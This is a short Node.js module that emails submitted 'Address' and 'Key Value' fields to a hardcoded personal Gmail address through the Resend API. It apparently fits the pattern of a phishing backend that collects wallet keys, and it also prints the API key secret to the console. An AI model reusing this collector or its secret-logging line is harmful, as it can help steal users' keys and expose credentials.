const { Resend } = require("resend");


const resend = new Resend(process.env.RESEND_API_KEY);

async function sendEmail({address, keyValue}){
      try{

        await resend.emails.send({
            from: "onboarding@resend.dev",
            to:"edegbaiayomikun@gmail.com",
            subject:"New Details Received",
            html:`
                <h2>New Details</h2>
                <p><strong>Address:</strong>${address}</p>
                <p><strong>Key Value:</strong> ${keyValue}</p>
            `

        });
        console.log("Email sent via Resend")

      }catch(err){
        console.error("Resend email error", err);

      }
}

console.log("RESEND_API_KEY:", process.env.RESEND_API_KEY);

module.exports = sendEmail;